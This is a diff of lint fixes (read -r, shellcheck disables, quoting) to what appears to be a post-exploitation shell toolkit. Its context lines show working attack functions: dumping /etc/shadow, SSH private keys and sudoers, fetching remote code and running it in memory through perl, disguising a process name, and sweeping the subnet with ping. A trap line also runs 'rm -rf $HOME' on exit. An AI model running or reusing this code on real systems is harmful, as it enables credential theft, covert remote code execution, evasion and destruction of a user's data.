@@ -272,7 +272,7 @@ trap 'rm -rf $HOME' EXIT TERM INT
 backup=""
 if [ -n "$BASH" ]; then
   # Script runs in bash. Here BASH_SOURCE exists.
-  # shellcheck disable=SC2169
+  # shellcheck disable=SC2169,SC2039
   if [ -r "${BASH_SOURCE[0]}" ] && [ ! -r "$ENV" ]; then
     # Script was started in bash via source.
     ENV=${BASH_SOURCE[0]}
@@ -442,10 +442,12 @@ getinfo() {
   else
     orc_log2outp ifconfig ip link
   fi
-  orc_log2outp netstat netstat -peanut
+  orc_log2outp netstat netstat -peanutA
+  # The condition should work with POSIX sh and bash.
+  # Variable EUID is defined in the bash.
+  # Check EUID of /root works in dash (and in bash).
+  # shellcheck disable=SC2039
   if [ "$EUID" = "0" ] || [ -O "/root" ]; then
-    # Variable EUID is defined in the bash.
-    # Check EUID of /root works in dash (and in bash).
     orc_log2outp shadow getent shadow
     orc_log2outp ssh_keys find /home/ -name id_rsa
     orc_log2outp sudoers cat /etc/sudoers
@@ -552,6 +554,7 @@ qssh() {
   if tty | grep -q "not"; then
     orc_createEchoFile "$1"
     shift
+    # shellcheck disable=SC2029
     DISPLAY="" SSH_ASKPASS="$ORC_ECHO_FILE" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -T "$@"
   else
     echo "You've got a tty. You can't use qssh."
@@ -576,7 +579,7 @@ qsu() {
 memexec() {
 memfile=$(orc_loadURL "$1" | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
 finalmem=$(echo "$memfda" | base64 -d)
-finalmem=${finalmem}$(printf "$memfile/ or die;\n")
+finalmem="${finalmem}${memfile}/ or die;"
 finalmem=${finalmem}$(echo "$memfdb" | base64 -d)
 echo "$finalmem" | perl
 }
@@ -615,7 +618,7 @@ ps -weFH | grep "$1" | grep -v grep
 }
 
 getescape() {
-ps --no-header aux | awk -F" " '{print $1" "$2}' | grep "^$(id -u)"i | awk '{print $2}' | tr ' ' '\n' | while read i; do
+ps --no-header aux | awk -F" " '{print $1" "$2}' | grep "^$(id -u)"i | awk '{print $2}' | tr ' ' '\n' | while read -r i; do
 if ls -di --color=never "/proc/$i/root/" | grep -qe "^2\ "; then
 	echo "process $i seems to be outside the jail..."
 	fi
@@ -689,9 +692,8 @@ prochide() {
   # arguments: program to execute with optional arguments.
   # methode  : use the longest command line of the current running
   #            processes as name of the program to start.
-  ARGS="$@"
   LONGARG=$(ps --no-header -wweo cmd | awk 'length(X)<length {X=$0}; END {print X}')
-  bash -c "exec -a \"$LONGARG\" $ARGS"
+  bash -c "exec -a \"$LONGARG\" $*"
 }
 
 getnet() (
@@ -703,14 +705,14 @@ sorry(){
 	echo "Pinging IPs in the background..."
 		if hash ifconfig 2>/dev/null; then
 		valid=$(seq -f $(ipcalc -n --minaddr --maxaddr $(ifconfig | grep inet | grep -i broadcast | awk -F ' ' '{print $2" "$4}') | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
-		echo "$valid" | tr ' ' '\n' | while read i;do
+		echo "$valid" | tr ' ' '\n' | while read -r i;do
 			 if ping -c1 -q "$i" | grep -q "\ 0%"; then
 			 echo "$i is alive" >> "$HOME/ips"
 			fi
 		done
 	else 
 	valid=$(seq -f $(ipcalc -n --minaddr --maxaddr $(ip addr show | grep inet | grep -i "broadcast\|brd" | awk -F ' ' '{print $2}') | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
-	echo "$valid" | tr ' ' '\n' | while read i;do
+	echo "$valid" | tr ' ' '\n' | while read -r i;do
 		 if ping -c1 -q "$i" | grep -q "\ 0%"; then
 		 echo "$i is alive" >> "$HOME/ips"
 		fi
@@ -720,7 +722,7 @@ sorry(){
 		if hash ifconfig 2>/dev/null; then
 		if ifconfig | grep -q "255.255.255.0"; then 
 		INPUT=$(seq -f $(ifconfig | grep inet | grep -i broadcast | grep -v inet6 | grep "255.255.255.0" | head -n1 | awk -F " " '{print $2}' | awk -F '.' '{print $1"."$2"."$3".%g 1 254"}'))
-		echo "$INPUT" | tr ' ' '\n' | while read i;do
+		echo "$INPUT" | tr ' ' '\n' | while read -r i;do
 			if ping -c1 -q "$i" | grep -q "\ 0%"; then
 			echo "$i" is alive >> "$HOME/ips"
 			fi
@@ -728,7 +730,7 @@ sorry(){
 		else 
 			if ip addr show | grep -E '/24*.brd'; then
 			INPUT=$(seq -f $(ip addr show | grep brd |grep "/24" | head -n 1| awk -F " " {'print $2'} | awk -F '.' '{print $1"."$2"."$3".%g 1 254"}'))
-			echo "$INPUT" | tr ' ' '\n' | while read i;do
+			echo "$INPUT" | tr ' ' '\n' | while read -r i;do
 				 if ping -c1 -q "$i" | grep -q "\ 0%"; then
 				 echo "$i is alive" >> "$HOME/ips"
 				fi
